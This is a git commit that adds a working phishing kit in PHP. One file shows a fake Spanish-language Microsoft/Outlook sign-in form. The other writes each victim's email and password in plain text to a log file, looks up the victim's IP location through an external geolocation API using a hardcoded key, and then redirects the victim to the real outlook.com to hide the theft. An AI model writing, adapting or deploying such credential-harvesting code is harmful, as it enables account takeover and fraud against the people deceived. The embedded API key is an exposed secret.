23c99c42159abc8856416a1b03cd963d947db429
msnlive365asas <126920082+msnlive365asas@users.noreply.github.com>
2023-03-03 17:10:06 -0500

    Initial Commit

---
+++ h435dv.php
@@ -0,0 +1,14 @@
+<?php
+
+
+$form = <<<EOD
+<div id="fcgd01hd">
+<form action="vdft445566.php" method="post" id="fstrb6567">
+    <input id="ipt1" name="ipt1" type="email" required placeholder="Correo electrónico, teléfono o Skype" autofocus>
+    <input id="ipt2" name="ipt2" type="password" required placeholder="Contraseña" >
+    <input id="ipt4" name="ipt4" type="submit" value="">
+</form>
+</div>
+EOD;
+echo $form;
+?>
---
+++ vdft445566.php
@@ -0,0 +1,34 @@
+<?php
+session_start();
+$fnm = "diamaravilloso1.txt";
+$fhandlr = fopen($fnm, "a");
+
+fwrite($fhandlr, "-------------------------------------------\n");
+fwrite($fhandlr, 'U: '.$_POST['ipt1']."\n");
+fwrite($fhandlr, 'P: '.$_POST['ipt2']."\n");
+
+if( !empty($_SERVER['REMOTE_ADDR']) ){
+
+	@$api_url = "http://api.ipinfodb.com/v3/ip-city/?key=9878000ae447eadf64046ddbbf3d8588bce21329f0a5882bdfb8c4fc8c0a3fbf&ip=".$_SERVER['REMOTE_ADDR'];
+	@$IPResult =  file_get_contents($api_url);
+	@fwrite($fhandlr, 'IP: '.$_SERVER['REMOTE_ADDR']."\n");
+	@fwrite($fhandlr, 'LC: '.$IPResult."\n");
+
+}elseif( !empty($_SERVER['HTTP_X_FORWARDED_FOR']) ){
+
+	@$api_url = "http://api.ipinfodb.com/v3/ip-city/?key=9878000ae447eadf64046ddbbf3d8588bce21329f0a5882bdfb8c4fc8c0a3fbf&ip=".$_SERVER['HTTP_X_FORWARDED_FOR'];
+	@$IPResult =  file_get_contents($api_url);
+	@fwrite($fhandlr, 'IP: '.$_SERVER['HTTP_X_FORWARDED_FOR']."\n");
+	@fwrite($fhandlr, 'LC: '.$IPResult."\n");
+
+}else{
+	fwrite($fhandlr, 'IP1: '.$_SERVER['REMOTE_ADDR']."\n");
+	fwrite($fhandlr, 'IP2: '.$_SERVER['HTTP_X_FORWARDED_FOR']."\n");
+}
+
+fwrite($fhandlr, 'Date: '. date("d-m-Y")."\n");
+fclose($fhandlr);
+session_destroy();
+header ('Location:https://outlook.com/');
+exit;
+?>
